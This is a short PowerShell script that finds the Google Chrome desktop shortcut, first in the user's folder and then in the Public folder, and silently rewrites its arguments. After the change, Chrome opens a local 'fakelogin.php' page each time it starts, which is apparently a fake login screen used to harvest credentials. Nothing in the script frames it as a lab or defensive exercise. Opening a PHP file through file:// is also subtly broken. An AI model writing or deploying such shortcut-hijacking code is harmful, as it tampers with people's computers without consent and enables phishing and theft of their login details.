$WshShell = New-Object -ComObject WScript.Shell

# Define both possible paths where the desktop shortcut could live
$UserShortcut = "$env:USERPROFILE\Desktop\Google Chrome.lnk"
$PublicShortcut = "C:\Users\Public\Desktop\Google Chrome.lnk"
$TargetFile = "file:///C:/Users/kyson/fakelogin.php"

if (Test-Path $UserShortcut) {
    # Modify the shortcut in the personal account folder
    $Shortcut = $WshShell.CreateShortcut($UserShortcut)
    $Shortcut.Arguments = $TargetFile
    $Shortcut.Save()
    Write-Output "Successfully modified the user-specific Chrome shortcut."
} elseif (Test-Path $PublicShortcut) {
    # Modify the shortcut in the global public folder
    $Shortcut = $WshShell.CreateShortcut($PublicShortcut)
    $Shortcut.Arguments = $TargetFile
    $Shortcut.Save()
    Write-Output "Successfully modified the Public Chrome shortcut."
} else {
    Write-Error "Could not find a Google Chrome shortcut on the desktop maps."
}
